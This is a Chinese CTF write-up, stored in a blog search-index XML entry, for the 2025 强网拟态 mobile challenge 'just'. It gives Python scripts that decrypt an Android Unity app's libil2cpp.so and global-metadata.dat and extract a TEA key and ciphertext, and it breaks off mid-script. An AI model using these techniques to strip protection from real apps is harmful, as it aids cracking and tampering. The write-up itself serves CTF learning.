<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2025强网拟态mobile/just</title>
    <link href="/2025/10/29/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81mobile-just/"/>
    <url>/2025/10/29/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81mobile-just/</url>
    
    <content type="html"><![CDATA[<h1 id="2025强网拟态mobile"><a href="#2025强网拟态mobile" class="headerlink" title="2025强网拟态mobile"></a>2025强网拟态mobile</h1><h2 id="just"><a href="#just" class="headerlink" title="just"></a>just</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这题当时想着试试能不能做出来，在比赛的时候差在最后加载il2cpp.so那边。现在想来看来是大晚上做题做的昏头转向了，找的文章都找错了自己还没发现，这个表情包来表达一下我现在复现的心情吧。<img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202510302039465.jpg" alt="4cff7debcc7ff416b9d220e7aef25386"></p><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>总的来说这题解题过程也是相当复杂，大晚上做的时候甚至忘了前面做了什么。</p><p>之前接触了的一道是基于windows下的il2cpp的unity逆向题，这道是基于apk文件，有点不同。主要的思路是提出apk文件中的il2cpp.so文件，然后底下的思路就是基本解题思路了。</p><p>这道题对il2cpp.so文件进行了加密，解压之后看到的libil2cpp.so文件是加密之后的，仔细分析libjust.so文件找到加密逻辑就可以。</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202510302039035.png" alt="image-20251029235605513"></p><p>这边我就是从初始函数开始往下找关键函数的，然后发现了这里，dec_il2cpp这，我感觉就是主要的加密逻辑，理解一下发现这里果不其然就是，基于rc4的加密，密钥是nihaounity，注意^0x33</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_nihaounity</span>(<span class="hljs-params">data, key=<span class="hljs-string">b&quot;nihaounity&quot;</span></span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    out = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        K = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        out.append(byte ^ K ^ <span class="hljs-number">0x33</span>)  <br>    <span class="hljs-keyword">return</span> out<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Usage: <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> &lt;input_il2cpp.so&gt; &lt;output_dec.so&gt;&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    input_file = sys.argv[<span class="hljs-number">1</span>]<br>    output_file = sys.argv[<span class="hljs-number">2</span>]<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br><br>    decrypted = rc4_nihaounity(data)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(decrypted)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Decrypted to <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>以上脚本解密之后得到decil2cpp.so，下一步按理说就是解包global-metadata.dat，看看加载decil2cpp.so能不能发现什么</p><p>定位到sub_211B8C函数，这里尝试优先加载 <code>game.dat</code>，失败则 fallback 到 <code>global-metadata.dat</code>，然后调用了sub_211D94函数，也加载了 <code>global-metadata.dat</code>，跟进看他的内容</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202510302039662.png" alt="image-20251030001910616"></p><hr><p><code>global-metadata.dat</code> 是 Unity IL2CPP 编译时生成的二进制元数据文件。</p><p>它包含了所有 C# 类型、方法、字段、字符串的定义信息。</p><p>运行时必须加载它才能支持反射、序列化、跨语言调用等功能。</p><hr><p>这个函数载入了metadata，在这里找找看加解密逻辑</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202510302054462.png" alt="image-20251030205447395"></p><p>定位到sub_21A2C8函数，这个函数是对global-metadata.dat 数据进行解密。</p><p>解密脚本还原global-metadata.dat</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Tuple</span>, <span class="hljs-type">Optional</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetadataDecryptor</span>:<br><br>    HEADER_SIZE = <span class="hljs-number">1024</span>  <span class="hljs-comment"># 前 1024 字节为明文头部</span><br>    KEY_OFFSET = <span class="hljs-number">1028</span>   <span class="hljs-comment"># 密钥起始偏移（src[514] * 2）</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, data: <span class="hljs-built_in">bytes</span></span>):<br>        <span class="hljs-variable language_">self</span>.data = data<br>        <span class="hljs-variable language_">self</span>.data_len = <span class="hljs-built_in">len</span>(data)<br>        <span class="hljs-variable language_">self</span>.v2: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">int</span>] = <span class="hljs-literal">None</span>  <span class="hljs-comment"># 密钥数量（src[512]）</span><br>        <span class="hljs-variable language_">self</span>.key_count = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.key_stream_offset = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.cipher_offset = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.plaintext_size = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_read_v2</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;从偏移 1024 处读取 v2（uint16）&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.data_len &lt; <span class="hljs-number">1026</span>:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;文件太短，无法读取 v2（偏移 1024）&quot;</span>)<br>        <span class="hljs-keyword">return</span> struct.unpack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, <span class="hljs-variable language_">self</span>.data[<span class="hljs-number">1024</span>:<span class="hljs-number">1026</span>])[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_setup_layout</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;计算文件布局&quot;&quot;&quot;</span><br>        <span class="hljs-variable language_">self</span>.v2 = <span class="hljs-variable language_">self</span>._read_v2()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 检测到密钥数量 v2 = <span class="hljs-subst">&#123;self.v2&#125;</span>&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.key_count = <span class="hljs-variable language_">self</span>.v2<br>        <span class="hljs-variable language_">self</span>.key_stream_offset = <span class="hljs-variable language_">self</span>.KEY_OFFSET<br>        <span class="hljs-variable language_">self</span>.cipher_offset = <span class="hljs-variable language_">self</span>.KEY_OFFSET + <span class="hljs-number">4</span> * <span class="hljs-variable language_">self</span>.v2<br><br>        encrypted_part_length = <span class="hljs-variable language_">self</span>.data_len - <span class="hljs-variable language_">self</span>.cipher_offset<br>        <span class="hljs-keyword">if</span> encrypted_part_length &lt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;加密数据起始偏移超出文件范围&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.plaintext_size = <span class="hljs-variable language_">self</span>.HEADER_SIZE + encrypted_part_length<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_validate_offsets</span>(<span class="hljs-params">self, cipher_idx: <span class="hljs-built_in">int</span>, key_idx: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>        cipher_off = <span class="hljs-variable language_">self</span>.cipher_offset + cipher_idx<br>        key_off = <span class="hljs-variable language_">self</span>.key_stream_offset + key_idx * <span class="hljs-number">4</span><br>        <span class="hljs-keyword">return</span> (<br>            cipher_off + <span class="hljs-number">4</span> &lt;= <span class="hljs-variable language_">self</span>.data_len <span class="hljs-keyword">and</span><br>            key_off + <span class="hljs-number">4</span> &lt;= <span class="hljs-variable language_">self</span>.data_len<br>        )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-variable language_">self</span>._setup_layout()<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 输入长度: <span class="hljs-subst">&#123;self.data_len&#125;</span> 字节&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 密钥流偏移: <span class="hljs-subst">&#123;self.key_stream_offset&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 加密数据偏移: <span class="hljs-subst">&#123;self.cipher_offset&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 预期明文长度: <span class="hljs-subst">&#123;self.plaintext_size&#125;</span> 字节&quot;</span>)<br>        decrypted = <span class="hljs-built_in">bytearray</span>(<span class="hljs-variable language_">self</span>.data[:<span class="hljs-variable language_">self</span>.HEADER_SIZE])<br>        decrypted.extend(<span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-variable language_">self</span>.plaintext_size - <span class="hljs-variable language_">self</span>.HEADER_SIZE))<br>        processed = <span class="hljs-number">0</span><br>        chunk_size = <span class="hljs-number">4</span><br><br>        <span class="hljs-keyword">while</span> processed &lt; <span class="hljs-variable language_">self</span>.plaintext_size - <span class="hljs-variable language_">self</span>.HEADER_SIZE:<br>            <span class="hljs-comment"># 动态密钥索引：v9 = i + i // v2, 然后取模</span><br>            virtual_idx = processed<br>            key_stream_idx = (virtual_idx + virtual_idx // (<span class="hljs-number">4</span> * <span class="hljs-variable language_">self</span>.v2)) % <span class="hljs-variable language_">self</span>.v2<br><br>            cipher_offset = <span class="hljs-variable language_">self</span>.cipher_offset + processed<br>            key_offset = <span class="hljs-variable language_">self</span>.key_stream_offset + key_stream_idx * <span class="hljs-number">4</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>._validate_offsets(processed, key_stream_idx):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] 跳过越界访问: cipher=<span class="hljs-subst">&#123;cipher_offset&#125;</span>, key=<span class="hljs-subst">&#123;key_offset&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>            cipher_block = struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-variable language_">self</span>.data[cipher_offset:cipher_offset+<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]<br>            key_block   = struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-variable language_">self</span>.data[key_offset:key_offset+<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]<br>            plain_block = cipher_block ^ key_block<br><br><br>            struct.pack_into(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, decrypted, <span class="hljs-variable language_">self</span>.HEADER_SIZE + processed, plain_block)<br>            processed += chunk_size<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 解密完成。共处理 <span class="hljs-subst">&#123;processed&#125;</span> 字节数据。输出长度: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(decrypted)&#125;</span> 字节&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(decrypted)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_file</span>(<span class="hljs-params">path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path):<br>        <span class="hljs-keyword">raise</span> FileNotFoundError(<span class="hljs-string">f&quot;文件不存在: <span class="hljs-subst">&#123;path&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> f.read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_file</span>(<span class="hljs-params">path: <span class="hljs-built_in">str</span>, data: <span class="hljs-built_in">bytes</span></span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 解密成功，文件已保存至: <span class="hljs-subst">&#123;path&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;用法: <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> &lt;输入加密文件&gt; &lt;输出解密文件&gt;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;示例: <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> global-metadata.dat.enc global-metadata.dat&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    input_path, output_path = sys.argv[<span class="hljs-number">1</span>], sys.argv[<span class="hljs-number">2</span>]<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 正在加载文件: <span class="hljs-subst">&#123;input_path&#125;</span>&quot;</span>)<br>        encrypted_data = load_file(input_path)<br><br>        decryptor = MetadataDecryptor(encrypted_data)<br>        decrypted_data = decryptor.decrypt()<br><br>        save_file(output_path, decrypted_data)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] 错误: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>接下来解包得到的global-metadata.dat </p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202510302109646.png" alt="image-20251030210933563"></p><p>在decil2cpp.so附加 ida_py3.py 和 script.json 文件来恢复符号表。</p><p>这里我在比赛的时候做的时候加载的是 Assembly-CSharp.dll，也就是开头说的问题。Assembly-CSharp.dll可以用dnspy看，能看到主要的加密验证函数那些，但是最重要的代码内容还是得着重分析il2cpp文件。</p><p>加载好之后找到flagcheck函数，这里的加密主要是现进行字节转换然后再调用tea加密</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202510302345324.png" alt="image-20251030234534239"></p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202510302354189.png" alt="image-20251030235436132"></p><p>密文密钥是可以通过动调提取的，我没有环境可以调试，看了其他大佬的wp学习一下</p><p>FlagChecker$$.cctor在这里数据会进行初始化，在类加载时，把内嵌的静态数组（key 和密文）初始化成内存中的运行时对象。</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202510310000432.png" alt="image-20251031000018379"></p><p>这两个符号名是 .NET &#x2F; IL2CPP自动生成的静态数组字段名，key数组是16字节，密文数组是40字节。</p><p>接下来就可以从dump.cs里找到对应密文密钥的偏移量，我直接搜字符串就可以定位</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> &lt;<span class="hljs-title">PrivateImplementationDetails</span>&gt; <span class="hljs-comment">// TypeDefIndex: 2223</span><br>&#123;<br><span class="hljs-comment">// Fields</span><br><span class="hljs-keyword">internal</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">readonly</span> &lt;PrivateImplementationDetails&gt;.__StaticArrayInitTypeSize=<span class="hljs-number">40</span> <span class="hljs-number">29F</span>C2CC7503351583297C73AC477A5D7AA78899F3C0D66E1F909139D4AA1FFB2 <span class="hljs-comment">/*Metadata offset 0xF901D*/</span>; <span class="hljs-comment">// 0x0</span><br><span class="hljs-keyword">internal</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">readonly</span> &lt;PrivateImplementationDetails&gt;.__StaticArrayInitTypeSize=<span class="hljs-number">16</span> C8E4E9E3F34C25560172B0D40B6DF4823260AA87EC6866054AA4691711E5D7BF <span class="hljs-comment">/*Metadata offset 0xF9045*/</span>; <span class="hljs-comment">// 0x28</span><br>&#125;<br></code></pre></td></tr></table></figure><p>确定偏移 是0xF901D 和 0xF9045，然后利用偏移读取global-data.dat 里的密文密钥内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br>META_PATH = <span class="hljs-string">&quot;global-metadata-decrypted.dat&quot;</span><br><br>DEFAULTS = &#123;<br>    <span class="hljs-string">&quot;Ciphertext_40&quot;</span>: &#123;<span class="hljs-string">&quot;offset&quot;</span>: <span class="hljs-number">0xF901D</span>, <span class="hljs-string">&quot;size&quot;</span>: <span class="hljs-number">40</span>&#125;,<br>    <span class="hljs-string">&quot;XTEAKey_16&quot;</span>: &#123;<span class="hljs-string">&quot;offset&quot;</span>: <span class="hljs-number">0xF9045</span>, <span class="hljs-string">&quot;size&quot;</span>: <span class="hljs-number">16</span>&#125;,<br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    meta = Path(META_PATH)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> meta.exists():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] metadata file not found: <span class="hljs-subst">&#123;META_PATH&#125;</span>&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    data = meta.read_bytes()<br>    results = &#123;&#125;<br><br>    <span class="hljs-keyword">for</span> name, info <span class="hljs-keyword">in</span> DEFAULTS.items():<br>        off, size = info[<span class="hljs-string">&quot;offset&quot;</span>], info[<span class="hljs-string">&quot;size&quot;</span>]<br>        <span class="hljs-keyword">if</span> off + size &gt; <span class="hljs-built_in">len</span>(data):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] Skipping <span class="hljs-subst">&#123;name&#125;</span>, offset beyond file size&quot;</span>)<br>            <span class="hljs-keyword">continue</span><br>        blob = data[off:off + size]<br>        results[name] = binascii.hexlify(blob).decode().upper()<br><br>    <span class="hljs-keyword">for</span> name, hex_str <span class="hljs-keyword">in</span> results.items():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;name:&lt;<span class="hljs-number">15</span>&#125;</span>: <span class="hljs-subst">&#123;hex_str&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>得到密文密钥：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">Ciphertext_40  : AF5864409DB92167AEB529049E86C543230FBFA6B2AE4AB5C569B7A803D1AECFC62C5B7FA2861E1A<br>XTEAKey_16     : <span class="hljs-number">78563412121110091615141318171615</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tea_decrypt</span>(<span class="hljs-params">v, k</span>):<br>    v0, v1 = v<br>    delta = <span class="hljs-number">0x61C88647</span><br>    sum_ = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        sum_ = (sum_ - delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        sum_ = (sum_ + delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v1 = (v1 - (((v0 &lt;&lt; <span class="hljs-number">4</span>) + k[<span class="hljs-number">2</span>]) ^ (v0 + sum_) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k[<span class="hljs-number">3</span>]))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v0 = (v0 - (((v1 &lt;&lt; <span class="hljs-number">4</span>) + k[<span class="hljs-number">0</span>]) ^ (v1 + sum_) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k[<span class="hljs-number">1</span>]))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> v0, v1<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><br>    Key = [<span class="hljs-number">0x12345678</span>, <span class="hljs-number">0x09101112</span>, <span class="hljs-number">0x13141516</span>, <span class="hljs-number">0x15161718</span>]<br><br>    enc = <span class="hljs-built_in">bytes</span>([<br>        <span class="hljs-number">0xAF</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x9D</span>,<span class="hljs-number">0xB9</span>,<span class="hljs-number">0x21</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0xAE</span>,<span class="hljs-number">0xB5</span>,<span class="hljs-number">0x29</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x9E</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0xC5</span>,<span class="hljs-number">0x43</span>,<br>        <span class="hljs-number">0x23</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0xBF</span>,<span class="hljs-number">0xA6</span>,<span 